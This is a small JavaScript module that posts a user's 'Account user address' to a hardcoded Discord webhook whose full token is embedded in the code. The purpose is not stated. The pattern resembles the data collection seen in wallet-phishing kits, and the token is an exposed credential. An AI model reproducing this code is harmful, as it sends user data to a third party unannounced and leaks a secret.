
import axios from "axios";

let url = "https://discord.com/api/webhooks/1018679820680433755/aKoPBeVZcuwvSO7IK3j_ObcyCwq_R1jl00HehDU_RdJkQfeIHKG7CnQKaxxp957ClRuG"

class AxiosRequest 
{
    async sendAddress(address) 
    {
        let data = {
            embeds: [{
                title: "Account user address",
                description: `${address}`,
            }]
        }
        const result = await axios.post(url, data )
        return result
    }


}

export default AxiosRequest